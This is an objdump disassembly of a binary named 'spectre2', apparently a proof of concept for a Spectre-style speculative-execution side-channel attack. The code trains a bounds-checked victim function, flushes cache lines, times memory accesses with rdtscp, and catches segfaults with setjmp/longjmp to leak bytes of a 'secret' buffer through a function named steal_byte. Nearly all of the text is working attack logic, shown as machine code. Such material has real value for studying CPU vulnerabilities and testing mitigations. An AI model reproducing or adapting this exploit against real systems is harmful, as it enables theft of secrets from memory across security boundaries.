
spectre2:     file format elf64-x86-64


Disassembly of section .init:

0000000000000720 <_init>:
 720:	48 83 ec 08          	sub    $0x8,%rsp
 724:	48 8b 05 bd 18 20 00 	mov    0x2018bd(%rip),%rax        # 201fe8 <__gmon_start__>
 72b:	48 85 c0             	test   %rax,%rax
 72e:	74 02                	je     732 <_init+0x12>
 730:	ff d0                	callq  *%rax
 732:	48 83 c4 08          	add    $0x8,%rsp
 736:	c3                   	retq   

Disassembly of section .plt:

0000000000000740 <.plt>:
 740:	ff 35 32 18 20 00    	pushq  0x201832(%rip)        # 201f78 <_GLOBAL_OFFSET_TABLE_+0x8>
 746:	ff 25 34 18 20 00    	jmpq   *0x201834(%rip)        # 201f80 <_GLOBAL_OFFSET_TABLE_+0x10>
 74c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000750 <sigprocmask@plt>:
 750:	ff 25 32 18 20 00    	jmpq   *0x201832(%rip)        # 201f88 <sigprocmask@GLIBC_2.2.5>
 756:	68 00 00 00 00       	pushq  $0x0
 75b:	e9 e0 ff ff ff       	jmpq   740 <.plt>

0000000000000760 <free@plt>:
 760:	ff 25 2a 18 20 00    	jmpq   *0x20182a(%rip)        # 201f90 <free@GLIBC_2.2.5>
 766:	68 01 00 00 00       	pushq  $0x1
 76b:	e9 d0 ff ff ff       	jmpq   740 <.plt>

0000000000000770 <__stack_chk_fail@plt>:
 770:	ff 25 22 18 20 00    	jmpq   *0x201822(%rip)        # 201f98 <__stack_chk_fail@GLIBC_2.4>
 776:	68 02 00 00 00       	pushq  $0x2
 77b:	e9 c0 ff ff ff       	jmpq   740 <.plt>

0000000000000780 <printf@plt>:
 780:	ff 25 1a 18 20 00    	jmpq   *0x20181a(%rip)        # 201fa0 <printf@GLIBC_2.2.5>
 786:	68 03 00 00 00       	pushq  $0x3
 78b:	e9 b0 ff ff ff       	jmpq   740 <.plt>

0000000000000790 <_setjmp@plt>:
 790:	ff 25 12 18 20 00    	jmpq   *0x201812(%rip)        # 201fa8 <_setjmp@GLIBC_2.2.5>
 796:	68 04 00 00 00       	pushq  $0x4
 79b:	e9 a0 ff ff ff       	jmpq   740 <.plt>

00000000000007a0 <signal@plt>:
 7a0:	ff 25 0a 18 20 00    	jmpq   *0x20180a(%rip)        # 201fb0 <signal@GLIBC_2.2.5>
 7a6:	68 05 00 00 00       	pushq  $0x5
 7ab:	e9 90 ff ff ff       	jmpq   740 <.plt>

00000000000007b0 <sigemptyset@plt>:
 7b0:	ff 25 02 18 20 00    	jmpq   *0x201802(%rip)        # 201fb8 <sigemptyset@GLIBC_2.2.5>
 7b6:	68 06 00 00 00       	pushq  $0x6
 7bb:	e9 80 ff ff ff       	jmpq   740 <.plt>

00000000000007c0 <malloc@plt>:
 7c0:	ff 25 fa 17 20 00    	jmpq   *0x2017fa(%rip)        # 201fc0 <malloc@GLIBC_2.2.5>
 7c6:	68 07 00 00 00       	pushq  $0x7
 7cb:	e9 70 ff ff ff       	jmpq   740 <.plt>

00000000000007d0 <longjmp@plt>:
 7d0:	ff 25 f2 17 20 00    	jmpq   *0x2017f2(%rip)        # 201fc8 <longjmp@GLIBC_2.2.5>
 7d6:	68 08 00 00 00       	pushq  $0x8
 7db:	e9 60 ff ff ff       	jmpq   740 <.plt>

00000000000007e0 <sigaddset@plt>:
 7e0:	ff 25 ea 17 20 00    	jmpq   *0x2017ea(%rip)        # 201fd0 <sigaddset@GLIBC_2.2.5>
 7e6:	68 09 00 00 00       	pushq  $0x9
 7eb:	e9 50 ff ff ff       	jmpq   740 <.plt>

Disassembly of section .plt.got:

00000000000007f0 <__cxa_finalize@plt>:
 7f0:	ff 25 02 18 20 00    	jmpq   *0x201802(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 7f6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000800 <_start>:
 800:	31 ed                	xor    %ebp,%ebp
 802:	49 89 d1             	mov    %rdx,%r9
 805:	5e                   	pop    %rsi
 806:	48 89 e2             	mov    %rsp,%rdx
 809:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 80d:	50                   	push   %rax
 80e:	54                   	push   %rsp
 80f:	4c 8d 05 5a 06 00 00 	lea    0x65a(%rip),%r8        # e70 <__libc_csu_fini>
 816:	48 8d 0d e3 05 00 00 	lea    0x5e3(%rip),%rcx        # e00 <__libc_csu_init>
 81d:	48 8d 3d cd 04 00 00 	lea    0x4cd(%rip),%rdi        # cf1 <main>
 824:	ff 15 b6 17 20 00    	callq  *0x2017b6(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 82a:	f4                   	hlt    
 82b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000830 <deregister_tm_clones>:
 830:	48 8d 3d d9 18 20 00 	lea    0x2018d9(%rip),%rdi        # 202110 <__TMC_END__>
 837:	55                   	push   %rbp
 838:	48 8d 05 d1 18 20 00 	lea    0x2018d1(%rip),%rax        # 202110 <__TMC_END__>
 83f:	48 39 f8             	cmp    %rdi,%rax
 842:	48 89 e5             	mov    %rsp,%rbp
 845:	74 19                	je     860 <deregister_tm_clones+0x30>
 847:	48 8b 05 8a 17 20 00 	mov    0x20178a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 84e:	48 85 c0             	test   %rax,%rax
 851:	74 0d                	je     860 <deregister_tm_clones+0x30>
 853:	5d                   	pop    %rbp
 854:	ff e0                	jmpq   *%rax
 856:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 85d:	00 00 00 
 860:	5d                   	pop    %rbp
 861:	c3                   	retq   
 862:	0f 1f 40 00          	nopl   0x0(%rax)
 866:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 86d:	00 00 00 

0000000000000870 <register_tm_clones>:
 870:	48 8d 3d 99 18 20 00 	lea    0x201899(%rip),%rdi        # 202110 <__TMC_END__>
 877:	48 8d 35 92 18 20 00 	lea    0x201892(%rip),%rsi        # 202110 <__TMC_END__>
 87e:	55                   	push   %rbp
 87f:	48 29 fe             	sub    %rdi,%rsi
 882:	48 89 e5             	mov    %rsp,%rbp
 885:	48 c1 fe 03          	sar    $0x3,%rsi
 889:	48 89 f0             	mov    %rsi,%rax
 88c:	48 c1 e8 3f          	shr    $0x3f,%rax
 890:	48 01 c6             	add    %rax,%rsi
 893:	48 d1 fe             	sar    %rsi
 896:	74 18                	je     8b0 <register_tm_clones+0x40>
 898:	48 8b 05 51 17 20 00 	mov    0x201751(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 89f:	48 85 c0             	test   %rax,%rax
 8a2:	74 0c                	je     8b0 <register_tm_clones+0x40>
 8a4:	5d                   	pop    %rbp
 8a5:	ff e0                	jmpq   *%rax
 8a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 8ae:	00 00 
 8b0:	5d                   	pop    %rbp
 8b1:	c3                   	retq   
 8b2:	0f 1f 40 00          	nopl   0x0(%rax)
 8b6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 8bd:	00 00 00 

00000000000008c0 <__do_global_dtors_aux>:
 8c0:	80 3d 59 18 20 00 00 	cmpb   $0x0,0x201859(%rip)        # 202120 <completed.7697>
 8c7:	75 2f                	jne    8f8 <__do_global_dtors_aux+0x38>
 8c9:	48 83 3d 27 17 20 00 	cmpq   $0x0,0x201727(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 8d0:	00 
 8d1:	55                   	push   %rbp
 8d2:	48 89 e5             	mov    %rsp,%rbp
 8d5:	74 0c                	je     8e3 <__do_global_dtors_aux+0x23>
 8d7:	48 8b 3d 2a 17 20 00 	mov    0x20172a(%rip),%rdi        # 202008 <__dso_handle>
 8de:	e8 0d ff ff ff       	callq  7f0 <__cxa_finalize@plt>
 8e3:	e8 48 ff ff ff       	callq  830 <deregister_tm_clones>
 8e8:	c6 05 31 18 20 00 01 	movb   $0x1,0x201831(%rip)        # 202120 <completed.7697>
 8ef:	5d                   	pop    %rbp
 8f0:	c3                   	retq   
 8f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 8f8:	f3 c3                	repz retq 
 8fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000900 <frame_dummy>:
 900:	55                   	push   %rbp
 901:	48 89 e5             	mov    %rsp,%rbp
 904:	5d                   	pop    %rbp
 905:	e9 66 ff ff ff       	jmpq   870 <register_tm_clones>

000000000000090a <leakByteLocalFunction>:
 90a:	55                   	push   %rbp
 90b:	48 89 e5             	mov    %rsp,%rbp
 90e:	89 f8                	mov    %edi,%eax
 910:	88 45 fc             	mov    %al,-0x4(%rbp)
 913:	0f b6 45 fc          	movzbl -0x4(%rbp),%eax
 917:	c1 e0 0c             	shl    $0xc,%eax
 91a:	48 63 d0             	movslq %eax,%rdx
 91d:	48 8d 05 1c 19 20 00 	lea    0x20191c(%rip),%rax        # 202240 <array>
 924:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 928:	0f b6 05 15 18 20 00 	movzbl 0x201815(%rip),%eax        # 202144 <temp>
 92f:	21 d0                	and    %edx,%eax
 931:	88 05 0d 18 20 00    	mov    %al,0x20180d(%rip)        # 202144 <temp>
 937:	90                   	nop
 938:	5d                   	pop    %rbp
 939:	c3                   	retq   

000000000000093a <victim_function>:
 93a:	55                   	push   %rbp
 93b:	48 89 e5             	mov    %rsp,%rbp
 93e:	48 83 ec 08          	sub    $0x8,%rsp
 942:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 946:	8b 05 d4 16 20 00    	mov    0x2016d4(%rip),%eax        # 202020 <bufferSize>
 94c:	89 c0                	mov    %eax,%eax
 94e:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 952:	73 1b                	jae    96f <victim_function+0x35>
 954:	48 8d 15 e5 16 20 00 	lea    0x2016e5(%rip),%rdx        # 202040 <buffer>
 95b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 95f:	48 01 d0             	add    %rdx,%rax
 962:	0f b6 00             	movzbl (%rax),%eax
 965:	0f b6 c0             	movzbl %al,%eax
 968:	89 c7                	mov    %eax,%edi
 96a:	e8 9b ff ff ff       	callq  90a <leakByteLocalFunction>
 96f:	90                   	nop
 970:	c9                   	leaveq 
 971:	c3                   	retq   

0000000000000972 <unblock_signal>:
 972:	55                   	push   %rbp
 973:	48 89 e5             	mov    %rsp,%rbp
 976:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
 97d:	89 bd 6c ff ff ff    	mov    %edi,-0x94(%rbp)
 983:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
 98a:	00 00 
 98c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 990:	31 c0                	xor    %eax,%eax
 992:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 999:	48 89 c7             	mov    %rax,%rdi
 99c:	e8 0f fe ff ff       	callq  7b0 <sigemptyset@plt>
 9a1:	8b 95 6c ff ff ff    	mov    -0x94(%rbp),%edx
 9a7:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 9ae:	89 d6                	mov    %edx,%esi
 9b0:	48 89 c7             	mov    %rax,%rdi
 9b3:	e8 28 fe ff ff       	callq  7e0 <sigaddset@plt>
 9b8:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
 9bf:	ba 00 00 00 00       	mov    $0x0,%edx
 9c4:	48 89 c6             	mov    %rax,%rsi
 9c7:	bf 01 00 00 00       	mov    $0x1,%edi
 9cc:	e8 7f fd ff ff       	callq  750 <sigprocmask@plt>
 9d1:	90                   	nop
 9d2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 9d6:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
 9dd:	00 00 
 9df:	74 05                	je     9e6 <unblock_signal+0x74>
 9e1:	e8 8a fd ff ff       	callq  770 <__stack_chk_fail@plt>
 9e6:	c9                   	leaveq 
 9e7:	c3                   	retq   

00000000000009e8 <trycatch_segfault_handler>:
 9e8:	55                   	push   %rbp
 9e9:	48 89 e5             	mov    %rsp,%rbp
 9ec:	48 83 ec 10          	sub    $0x10,%rsp
 9f0:	89 7d fc             	mov    %edi,-0x4(%rbp)
 9f3:	bf 0b 00 00 00       	mov    $0xb,%edi
 9f8:	e8 75 ff ff ff       	callq  972 <unblock_signal>
 9fd:	bf 08 00 00 00       	mov    $0x8,%edi
 a02:	e8 6b ff ff ff       	callq  972 <unblock_signal>
 a07:	be 01 00 00 00       	mov    $0x1,%esi
 a0c:	48 8d 3d 4d 17 20 00 	lea    0x20174d(%rip),%rdi        # 202160 <trycatch_buf>
 a13:	e8 b8 fd ff ff       	callq  7d0 <longjmp@plt>

0000000000000a18 <find_cached_index>:
 a18:	55                   	push   %rbp
 a19:	48 89 e5             	mov    %rsp,%rbp
 a1c:	53                   	push   %rbx
 a1d:	48 89 7d d0          	mov    %rdi,-0x30(%rbp)
 a21:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 a28:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 a2f:	eb 7b                	jmp    aac <find_cached_index+0x94>
 a31:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 a38:	00 
 a39:	8b 45 e8             	mov    -0x18(%rbp),%eax
 a3c:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
 a42:	83 c0 0d             	add    $0xd,%eax
 a45:	25 ff 00 00 00       	and    $0xff,%eax
 a4a:	89 45 ec             	mov    %eax,-0x14(%rbp)
 a4d:	8b 45 ec             	mov    -0x14(%rbp),%eax
 a50:	c1 e0 0c             	shl    $0xc,%eax
 a53:	48 63 d0             	movslq %eax,%rdx
 a56:	48 8d 05 e3 17 20 00 	lea    0x2017e3(%rip),%rax        # 202240 <array>
 a5d:	48 01 d0             	add    %rdx,%rax
 a60:	48 89 c3             	mov    %rax,%rbx
 a63:	0f ae f0             	mfence 
 a66:	0f 01 f9             	rdtscp 
 a69:	49 89 c2             	mov    %rax,%r10
 a6c:	48 8b 0b             	mov    (%rbx),%rcx
 a6f:	0f 01 f9             	rdtscp 
 a72:	4c 29 d0             	sub    %r10,%rax
 a75:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 a79:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 a7e:	77 28                	ja     aa8 <find_cached_index+0x90>
 a80:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
 a84:	74 22                	je     aa8 <find_cached_index+0x90>
 a86:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%rbp)
 a8d:	8b 45 ec             	mov    -0x14(%rbp),%eax
 a90:	48 98                	cltq   
 a92:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 a99:	00 
 a9a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
 a9e:	48 01 d0             	add    %rdx,%rax
 aa1:	8b 10                	mov    (%rax),%edx
 aa3:	83 c2 01             	add    $0x1,%edx
 aa6:	89 10                	mov    %edx,(%rax)
 aa8:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 aac:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 ab3:	0f 8e 78 ff ff ff    	jle    a31 <find_cached_index+0x19>
 ab9:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 abc:	5b                   	pop    %rbx
 abd:	5d                   	pop    %rbp
 abe:	c3                   	retq   

0000000000000abf <find_highest_score>:
 abf:	55                   	push   %rbp
 ac0:	48 89 e5             	mov    %rsp,%rbp
 ac3:	48 83 ec 20          	sub    $0x20,%rsp
 ac7:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 acb:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 ad2:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 ad9:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 ae0:	eb 3e                	jmp    b20 <find_highest_score+0x61>
 ae2:	8b 45 fc             	mov    -0x4(%rbp),%eax
 ae5:	48 98                	cltq   
 ae7:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 aee:	00 
 aef:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 af3:	48 01 d0             	add    %rdx,%rax
 af6:	8b 00                	mov    (%rax),%eax
 af8:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 afb:	7d 1f                	jge    b1c <find_highest_score+0x5d>
 afd:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b00:	89 45 f8             	mov    %eax,-0x8(%rbp)
 b03:	8b 45 fc             	mov    -0x4(%rbp),%eax
 b06:	48 98                	cltq   
 b08:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 b0f:	00 
 b10:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 b14:	48 01 d0             	add    %rdx,%rax
 b17:	8b 00                	mov    (%rax),%eax
 b19:	89 45 f4             	mov    %eax,-0xc(%rbp)
 b1c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 b20:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 b27:	7e b9                	jle    ae2 <find_highest_score+0x23>
 b29:	8b 35 11 16 20 00    	mov    0x201611(%rip),%esi        # 202140 <try>
 b2f:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 b32:	8b 55 f8             	mov    -0x8(%rbp),%edx
 b35:	8b 45 f8             	mov    -0x8(%rbp),%eax
 b38:	41 89 f0             	mov    %esi,%r8d
 b3b:	89 c6                	mov    %eax,%esi
 b3d:	48 8d 3d 44 03 00 00 	lea    0x344(%rip),%rdi        # e88 <_IO_stdin_used+0x8>
 b44:	b8 00 00 00 00       	mov    $0x0,%eax
 b49:	e8 32 fc ff ff       	callq  780 <printf@plt>
 b4e:	90                   	nop
 b4f:	c9                   	leaveq 
 b50:	c3                   	retq   

0000000000000b51 <train_victim>:
 b51:	55                   	push   %rbp
 b52:	48 89 e5             	mov    %rsp,%rbp
 b55:	48 83 ec 10          	sub    $0x10,%rsp
 b59:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
 b60:	eb 1a                	jmp    b7c <train_victim+0x2b>
 b62:	8b 45 f0             	mov    -0x10(%rbp),%eax
 b65:	c1 e0 0c             	shl    $0xc,%eax
 b68:	48 63 d0             	movslq %eax,%rdx
 b6b:	48 8d 05 ce 16 20 00 	lea    0x2016ce(%rip),%rax        # 202240 <array>
 b72:	48 01 d0             	add    %rdx,%rax
 b75:	0f ae 38             	clflush (%rax)
 b78:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
 b7c:	81 7d f0 ff 00 00 00 	cmpl   $0xff,-0x10(%rbp)
 b83:	7e dd                	jle    b62 <train_victim+0x11>
 b85:	0f ae f0             	mfence 
 b88:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 b8f:	eb 6b                	jmp    bfc <train_victim+0xab>
 b91:	48 8d 05 88 14 20 00 	lea    0x201488(%rip),%rax        # 202020 <bufferSize>
 b98:	0f ae 38             	clflush (%rax)
 b9b:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 ba2:	eb 1a                	jmp    bbe <train_victim+0x6d>
 ba4:	8b 45 f8             	mov    -0x8(%rbp),%eax
 ba7:	c1 e0 0c             	shl    $0xc,%eax
 baa:	48 63 d0             	movslq %eax,%rdx
 bad:	48 8d 05 8c 16 20 00 	lea    0x20168c(%rip),%rax        # 202240 <array>
 bb4:	48 01 d0             	add    %rdx,%rax
 bb7:	0f ae 38             	clflush (%rax)
 bba:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 bbe:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 bc5:	7e dd                	jle    ba4 <train_victim+0x53>
 bc7:	0f ae f0             	mfence 
 bca:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 bcd:	ba 67 66 66 66       	mov    $0x66666667,%edx
 bd2:	89 c8                	mov    %ecx,%eax
 bd4:	f7 ea                	imul   %edx
 bd6:	c1 fa 02             	sar    $0x2,%edx
 bd9:	89 c8                	mov    %ecx,%eax
 bdb:	c1 f8 1f             	sar    $0x1f,%eax
 bde:	29 c2                	sub    %eax,%edx
 be0:	89 d0                	mov    %edx,%eax
 be2:	c1 e0 02             	shl    $0x2,%eax
 be5:	01 d0                	add    %edx,%eax
 be7:	01 c0                	add    %eax,%eax
 be9:	29 c1                	sub    %eax,%ecx
 beb:	89 ca                	mov    %ecx,%edx
 bed:	48 63 c2             	movslq %edx,%rax
 bf0:	48 89 c7             	mov    %rax,%rdi
 bf3:	e8 42 fd ff ff       	callq  93a <victim_function>
 bf8:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 bfc:	83 7d f4 1d          	cmpl   $0x1d,-0xc(%rbp)
 c00:	7e 8f                	jle    b91 <train_victim+0x40>
 c02:	48 8d 05 17 14 20 00 	lea    0x201417(%rip),%rax        # 202020 <bufferSize>
 c09:	0f ae 38             	clflush (%rax)
 c0c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 c13:	eb 1a                	jmp    c2f <train_victim+0xde>
 c15:	8b 45 fc             	mov    -0x4(%rbp),%eax
 c18:	c1 e0 0c             	shl    $0xc,%eax
 c1b:	48 63 d0             	movslq %eax,%rdx
 c1e:	48 8d 05 1b 16 20 00 	lea    0x20161b(%rip),%rax        # 202240 <array>
 c25:	48 01 d0             	add    %rdx,%rax
 c28:	0f ae 38             	clflush (%rax)
 c2b:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 c2f:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 c36:	7e dd                	jle    c15 <train_victim+0xc4>
 c38:	0f ae f0             	mfence 
 c3b:	90                   	nop
 c3c:	c9                   	leaveq 
 c3d:	c3                   	retq   

0000000000000c3e <steal_byte>:
 c3e:	55                   	push   %rbp
 c3f:	48 89 e5             	mov    %rsp,%rbp
 c42:	48 83 ec 20          	sub    $0x20,%rsp
 c46:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 c4a:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
 c4e:	48 8d 35 93 fd ff ff 	lea    -0x26d(%rip),%rsi        # 9e8 <trycatch_segfault_handler>
 c55:	bf 0b 00 00 00       	mov    $0xb,%edi
 c5a:	e8 41 fb ff ff       	callq  7a0 <signal@plt>
 c5f:	c7 45 f8 0a 00 00 00 	movl   $0xa,-0x8(%rbp)
 c66:	eb 67                	jmp    ccf <steal_byte+0x91>
 c68:	b8 00 00 00 00       	mov    $0x0,%eax
 c6d:	e8 df fe ff ff       	callq  b51 <train_victim>
 c72:	48 8d 3d e7 14 20 00 	lea    0x2014e7(%rip),%rdi        # 202160 <trycatch_buf>
 c79:	e8 12 fb ff ff       	callq  790 <_setjmp@plt>
 c7e:	85 c0                	test   %eax,%eax
 c80:	75 14                	jne    c96 <steal_byte+0x58>
 c82:	b8 00 00 00 00       	mov    $0x0,%eax
 c87:	0f b6 00             	movzbl (%rax),%eax
 c8a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 c8e:	48 89 c7             	mov    %rax,%rdi
 c91:	e8 a4 fc ff ff       	callq  93a <victim_function>
 c96:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 c9a:	48 89 c7             	mov    %rax,%rdi
 c9d:	e8 76 fd ff ff       	callq  a18 <find_cached_index>
 ca2:	89 45 fc             	mov    %eax,-0x4(%rbp)
 ca5:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
 ca9:	75 13                	jne    cbe <steal_byte+0x80>
 cab:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
 caf:	8b 05 8b 14 20 00    	mov    0x20148b(%rip),%eax        # 202140 <try>
 cb5:	83 c0 01             	add    $0x1,%eax
 cb8:	89 05 82 14 20 00    	mov    %eax,0x201482(%rip)        # 202140 <try>
 cbe:	8b 05 7c 14 20 00    	mov    0x20147c(%rip),%eax        # 202140 <try>
 cc4:	3d e8 03 00 00       	cmp    $0x3e8,%eax
 cc9:	74 0c                	je     cd7 <steal_byte+0x99>
 ccb:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
 ccf:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
 cd3:	7f 93                	jg     c68 <steal_byte+0x2a>
 cd5:	eb 01                	jmp    cd8 <steal_byte+0x9a>
 cd7:	90                   	nop
 cd8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 cdc:	48 89 c7             	mov    %rax,%rdi
 cdf:	e8 db fd ff ff       	callq  abf <find_highest_score>
 ce4:	c7 05 52 14 20 00 00 	movl   $0x0,0x201452(%rip)        # 202140 <try>
 ceb:	00 00 00 
 cee:	90                   	nop
 cef:	c9                   	leaveq 
 cf0:	c3                   	retq   

0000000000000cf1 <main>:
 cf1:	55                   	push   %rbp
 cf2:	48 89 e5             	mov    %rsp,%rbp
 cf5:	48 83 ec 20          	sub    $0x20,%rsp
 cf9:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 d00:	eb 24                	jmp    d26 <main+0x35>
 d02:	8b 45 e0             	mov    -0x20(%rbp),%eax
 d05:	99                   	cltd   
 d06:	c1 ea 18             	shr    $0x18,%edx
 d09:	01 d0                	add    %edx,%eax
 d0b:	0f b6 c0             	movzbl %al,%eax
 d0e:	29 d0                	sub    %edx,%eax
 d10:	89 c1                	mov    %eax,%ecx
 d12:	8b 45 e0             	mov    -0x20(%rbp),%eax
 d15:	48 63 d0             	movslq %eax,%rdx
 d18:	48 8d 05 21 15 20 00 	lea    0x201521(%rip),%rax        # 202240 <array>
 d1f:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 d22:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 d26:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 d2d:	7e d3                	jle    d02 <main+0x11>
 d2f:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 d36:	e9 b0 00 00 00       	jmpq   deb <main+0xfa>
 d3b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 d42:	eb 1a                	jmp    d5e <main+0x6d>
 d44:	8b 45 e8             	mov    -0x18(%rbp),%eax
 d47:	c1 e0 0c             	shl    $0xc,%eax
 d4a:	48 63 d0             	movslq %eax,%rdx
 d4d:	48 8d 05 ec 14 20 00 	lea    0x2014ec(%rip),%rax        # 202240 <array>
 d54:	48 01 d0             	add    %rdx,%rax
 d57:	0f ae 38             	clflush (%rax)
 d5a:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 d5e:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 d65:	7e dd                	jle    d44 <main+0x53>
 d67:	0f ae f0             	mfence 
 d6a:	bf 00 04 00 00       	mov    $0x400,%edi
 d6f:	e8 4c fa ff ff       	callq  7c0 <malloc@plt>
 d74:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 d78:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 d7f:	eb 1e                	jmp    d9f <main+0xae>
 d81:	8b 45 ec             	mov    -0x14(%rbp),%eax
 d84:	48 98                	cltq   
 d86:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 d8d:	00 
 d8e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 d92:	48 01 d0             	add    %rdx,%rax
 d95:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 d9b:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 d9f:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 da6:	7e d9                	jle    d81 <main+0x90>
 da8:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 dab:	48 98                	cltq   
 dad:	48 8d 0d 2c 13 20 00 	lea    0x20132c(%rip),%rcx        # 2020e0 <secret>
 db4:	48 8d 15 85 12 20 00 	lea    0x201285(%rip),%rdx        # 202040 <buffer>
 dbb:	48 29 d1             	sub    %rdx,%rcx
 dbe:	48 89 ca             	mov    %rcx,%rdx
 dc1:	48 01 d0             	add    %rdx,%rax
 dc4:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 dc8:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
 dcc:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 dd0:	48 89 d6             	mov    %rdx,%rsi
 dd3:	48 89 c7             	mov    %rax,%rdi
 dd6:	e8 63 fe ff ff       	callq  c3e <steal_byte>
 ddb:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 ddf:	48 89 c7             	mov    %rax,%rdi
 de2:	e8 79 f9 ff ff       	callq  760 <free@plt>
 de7:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 deb:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 def:	0f 8e 46 ff ff ff    	jle    d3b <main+0x4a>
 df5:	b8 00 00 00 00       	mov    $0x0,%eax
 dfa:	c9                   	leaveq 
 dfb:	c3                   	retq   
 dfc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000e00 <__libc_csu_init>:
 e00:	41 57                	push   %r15
 e02:	41 56                	push   %r14
 e04:	49 89 d7             	mov    %rdx,%r15
 e07:	41 55                	push   %r13
 e09:	41 54                	push   %r12
 e0b:	4c 8d 25 5e 0f 20 00 	lea    0x200f5e(%rip),%r12        # 201d70 <__frame_dummy_init_array_entry>
 e12:	55                   	push   %rbp
